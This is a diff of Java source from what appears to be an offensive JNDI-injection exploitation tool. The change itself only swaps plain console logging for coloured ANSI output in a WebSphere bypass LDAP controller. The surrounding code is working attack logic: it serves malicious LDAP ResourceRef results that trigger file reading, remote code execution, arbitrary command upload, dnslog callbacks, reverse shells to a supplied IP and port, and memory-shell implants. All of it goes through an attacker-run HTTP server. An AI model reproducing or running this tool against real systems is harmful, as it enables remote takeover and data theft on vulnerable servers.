@@ -14,6 +14,8 @@ import javax.naming.Reference;
 import javax.naming.StringRefAddr;
 import java.util.Properties;
 
+import static org.fusesource.jansi.Ansi.ansi;
+
 /*
      * Requires:
      * - websphere v6-9 libraries in the classpath
@@ -28,7 +30,7 @@ public class WebsphereBypassController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
 
-        System.out.println("[+] Sending LDAP ResourceRef result for " + base);
+        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base));
 
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
@@ -66,20 +68,20 @@ public class WebsphereBypassController implements LdapController {
 
             try{
                 actionType = WebsphereActionType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
-                System.out.println("[+] ActionType: " + actionType);
+                System.out.println( ansi().render("@|green [+]|@ @|MAGENTA ActionType >> |@" + actionType));
             }catch(IllegalArgumentException e){
-                throw new UnSupportedActionTypeException("UnSupportedActionType: " + base.substring(firstIndex + 1, secondIndex));
+                throw new UnSupportedActionTypeException("UnSupportedActionType >> " + base.substring(firstIndex + 1, secondIndex));
             }
 
             switch(actionType){
                 case list:
                     String file = base.substring(base.lastIndexOf("=") + 1);
-                    System.out.println("[+] Read File/List Directory: " + file);
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Read File/List Directory >> |@" + file));
                     injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/list.wsdl?file=" + file;
                     break;
                 case rce:
                     String localJarFile = base.substring(base.lastIndexOf("=") + 1);
-                    System.out.println("[+] Local jar path: " + localJarFile);
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Local jar path >> |@" + localJarFile));
                     localJarPath = localJarFile;
                     break;
                 case upload:
@@ -98,22 +100,22 @@ public class WebsphereBypassController implements LdapController {
                         throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                     }
 
-                    System.out.println("[+] PayloadType: " + payloadType);
+                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA PayloadType >> |@" + payloadType));
                     switch (payloadType){
                         case command:
                             String cmd = Util.getCmdFromBase(base);
-                            System.out.println("[+] Command: " + cmd);
+                            System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                             injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=command&cmd=" + cmd;
                             break;
                         case dnslog:
                             String url = base.substring(base.lastIndexOf("/") + 1);
-                            System.out.println("[+] URL: " + url);
+                            System.out.println( ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
                             injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=dnslog&url=" + url;
                             break;
                         case reverseshell:
                             String[] results = Util.getIPAndPortFromBase(base);
-                            System.out.println("[+] IP: " + results[0]);
-                            System.out.println("[+] Port: " + results[1]);
+                            System.out.println( ansi().render("@|green [+]|@ @|MAGENTA IP >> |@" + results[0]));
+                            System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Port >> |@" + results[1]));
                             injectUrl = "http://" + Config.ip + ":" + Config.httpPort + "/upload.wsdl?type=reverseshell&ip=" + results[0] + "&port=" + results[1];
                             break;
                         case webspherememshell:
